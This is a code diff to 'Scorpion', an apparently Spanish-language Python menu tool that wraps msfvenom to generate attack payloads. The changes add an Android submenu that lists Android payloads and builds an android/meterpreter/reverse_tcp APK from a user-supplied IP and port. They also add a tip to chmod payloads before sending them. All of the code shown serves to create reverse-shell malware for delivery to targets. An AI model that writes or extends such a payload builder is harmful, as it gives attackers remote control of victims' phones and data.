@@ -68,12 +68,13 @@ def menu():
         os.system('clear')
         time.sleep(1)
         options = '''
+    [!] Es aconsejable darle permisos a los payloads antes de enviarlos con chmod.
     [00] Salir
     [01] Volver al menú
     [02] Ver la lista de payloads disponibles
     [03] Generar payloads para Windows
     [04] Generar payloads para Linux
-    [05] Generar payloads para Android
+    [05] Generar payloads para Andrroid
     [06] Generar payloads en diferentes lenguajes
     '''
         print(Fore.BLUE + Back.RESET + options)
@@ -223,14 +224,55 @@ def menu():
 
         elif choice == '05':
             os.system('clear')
-            port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
-            ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
-            archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
-            os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {archivo}.apk')
-            print('\n[>] Payload generador en tu directorio actual')
-            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
-            print(Fore.RESET + Back.RESET)
-            menu()
+            options = '''
+[00] Salir
+[01] Volver al menú
+[02] Ver todos los payloads posibles
+[03] Generar payloads para Android
+'''
+            print(Fore.BLUE + Back.RESET + options)
+
+            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')
+
+            if choice == '00':
+                os.system('clear')
+                print(Fore.RESET + Back.RESET)
+                sys.exit()
+
+            elif choice == '01':
+                os.system('clear')
+                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
+                print(Fore.RESET + Back.RESET)
+                menu()
+
+            elif choice == '02':
+                os.system('clear')
+                print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles para Android')
+                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
+                os.system('msfvenom -l payloads | grep android')
+                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
+                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
+                print(Fore.RESET + Back.RESET)
+                menu()
+
+            elif choice == '03':
+                os.system('clear')
+                port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
+                ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
+                archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
+                os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {archivo}.apk')
+                print('\n[>] Payload generador en tu directorio actual')
+                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
+                print(Fore.RESET + Back.RESET)
+                menu()
+
+            else:
+                os.system('clear')
+                print(Fore.BLUE + Back.RESET + '\n[>] Error: Command not found')
+                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
+                print(Fore.RESET + Back.RESET)
+                menu()
+
 
         elif choice == '06':
             os.system('clear')
